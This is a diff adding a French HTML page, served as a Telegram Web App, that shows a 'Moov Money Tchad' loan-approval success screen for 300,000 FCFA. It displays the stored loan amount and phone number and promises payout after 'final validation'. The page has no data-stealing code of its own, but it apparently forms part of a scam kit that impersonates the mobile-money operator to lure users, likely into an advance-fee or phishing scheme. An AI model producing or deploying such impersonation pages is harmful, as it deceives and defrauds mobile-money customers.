@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Moov Money Tchad - Succès</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --moov-orange: #ff6600;
+            --moov-blue: #0044cc;
+        }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--moov-blue); margin: 0; padding: 20px 15px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+
+        .screen-container { width: 100%; max-width: 400px; background-color: #ffffff; border-radius: 28px; padding: 30px 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); display: flex; flex-direction: column; align-items: center; }
+        .check-circle { width: 80px; height: 80px; background: var(--moov-orange); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 38px; font-weight: 900; margin-bottom: 20px; }
+        
+        .congrats-title { font-size: 24px; font-weight: 800; color: #000; margin-bottom: 12px; }
+        .amount-box { width: 100%; background: var(--moov-blue); border-radius: 16px; padding: 22px 15px; text-align: center; color: white; margin-bottom: 25px; border-bottom: 4px solid var(--moov-orange); }
+        .amount-value { font-size: 32px; font-weight: 900; }
+
+        .info-card { width: 100%; background-color: #fff7ed; border: 1.5px solid #ffedd5; border-radius: 16px; padding: 20px 18px; margin-bottom: 25px; }
+        
+        .home-btn { background-color: var(--moov-orange); color: white; border: none; width: 100%; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+
+<div class="screen-container">
+    <div class="check-circle">✓</div>
+    <div class="congrats-title">🎉 Félicitations !</div>
+    <div style="color: #666; font-size: 15px; text-align: center; margin-bottom: 25px;">Votre prêt a été approuvé avec succès par Moov Money Tchad.</div>
+
+    <div class="amount-box">
+        <div style="font-size: 12px; opacity: 0.9; margin-bottom: 6px;">MONTANT APPROUVÉ</div>
+        <div class="amount-value" id="display-amount">300 000 FCFA</div>
+    </div>
+
+    <div class="info-card">
+        <div style="color: #c2410c; font-weight: 800; margin-bottom: 8px;">⚠️ RAPPEL DE SÉCURITÉ</div>
+        <div style="font-size: 13.5px; color: #4a4a4a; line-height: 1.5;">
+            Le décaissement des fonds sur votre compte Moov (+235 <span id="display-phone"></span>) sera effectué sous 24h ouvrées après validation finale.
+        </div>
+    </div>
+
+    <button class="home-btn" onclick="window.location.href='/'">🏠 Retour à l'accueil</button>
+</div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+        if (window.Telegram?.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); }
+        const amount = localStorage.getItem('loan_amount') || "300000";
+        document.getElementById('display-amount').innerText = Number(amount).toLocaleString('fr-FR') + " FCFA";
+        document.getElementById('display-phone').innerText = localStorage.getItem('phone') || "";
+    });
+</script>
+</body>
+</html>
